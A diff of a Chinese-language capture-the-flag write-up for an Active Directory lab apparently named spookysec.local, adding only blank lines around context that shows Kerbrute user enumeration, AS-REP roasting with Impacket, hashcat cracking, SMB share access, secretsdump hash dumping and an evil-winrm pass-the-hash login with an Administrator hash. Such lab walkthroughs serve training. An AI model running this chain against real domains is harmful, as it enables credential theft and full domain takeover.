@@ -48,6 +48,8 @@ repost:
 
 ![](images/11833e2eaf3e0719d2d78bfee63ed14d.png)
 
+
+
 ### 任务二
 
 安装Impacket    git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
@@ -146,6 +148,7 @@ Nmap done: 1 IP address (1 host up) scanned in 400.87 seconds
 
 
 ![](images/9bde64e35e0bcd4bc287d06181e749e4.png)
+
 枚举域控制器
 Kerberos是Active Directory的身份验证服务，使用Kerbrute进行暴力破解
 
@@ -156,6 +159,8 @@ Kerberos是Active Directory的身份验证服务，使用Kerbrute进行暴力破
 
 
 ![](images/ba4326a83c2779360587e797a543b3d6.png)
+
+
 
 ``` Shell
 ./kerbrute userenum --dc spookysec.local -d spookysec.local names.txt
@@ -183,6 +188,8 @@ python3 GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
 
 ![](images/906c70006581a8732f731c1258f65b4f.png)
 
+
+
 ```
 svc-admin@SPOOKYSEC.LOCAL:457e09d7ed42ec8c26642922bb981b47$e43e2ca35056e471f66faf765e0f19feaea35e5b43b23189adb428293ec9647797d8ba3e1c739b6a38fd162c6742b5f5b59e63be475be37d28c08261163b8909856024718c23c04f05281cab1fa47e457d966586d8894ea34d3aec6c8169a68383d8b2016d5f9576a7cc7e4a5629f233a845af6fd2b8764efec02ed281afc87fb872a3c5e62452b53299abd0dd61174ed69095442910cb4214322f769c6957c906514ef723da659b6871cdfcfe11f9a1e9364c36e7121cff7f2f1979f0bd727537e4f2d633a0670d4e1fc995e9602fd2193a9070283938260760413243072f205eb7e5af0bfe2a7a99b7fc0e59616286ef78
 ```
@@ -196,6 +203,7 @@ hashcat -a 0 -m 18200 hash.txt password.txt --force
 password.txt题目给出
 
 ![](images/87f921e597ecff2ee5c8047bb0e60aab.png)
+
 使用域控制器上的用户凭据访问的共享
 
 ``` Shell
@@ -205,6 +213,7 @@ smbclient -L \\\\10.10.113.186\\ -U 'svc-admin'
 
 
 ![](images/5db2b04b78d9dec4d9d844afe593680b.png)
+
 尝试SMB登录 
 
 ``` Shell
@@ -214,18 +223,25 @@ smbclient \\\\spookysec.local\\backup -U 'svc-admin'
 
 
 ![](images/d4ea5a51a6a3731a356d7cb22a299c7a.png)
+
 dir查看当前目录下有一个文件，下载到本地看看
 
 ![](images/c6d91d1164076a61198e39754bc017c4.png)
 
 
 
+
+
 ![](images/429539991325b97eb0b1ca9701238222.png)
+
 base64解码
 
 ![](images/27f7b313b562f421b6afb9ae0ff4cf75.png)
 
+
+
 ![](images/6d8243a3b1dd925e8fdf47fe58902792.png)
+
 接下来尝试提权
 backup账号具有唯一权限，允许所有 Active Directory 更改与此用户帐户同步，secretsdump.py转储密码哈希
 
@@ -315,6 +331,7 @@ ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
 
 
 ![](images/8a53c395b5e2c1360974c3574d76b547.png)
+
 使用evilwinrm 工具传递哈希尝试管理员账户的哈希登录
 
 ``` Shell
@@ -325,6 +342,11 @@ evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i spookysec.loc
 
 ![](images/7d530e3edf7a1630f6eb93f2e27f749b.png)
 
+
+
 ![](images/75eb7325d0f1221cc12b8ba9615742f8.png)
 
+
+
 ![](images/fcebe352b41f7fdec962915b94f08c04.png)
+
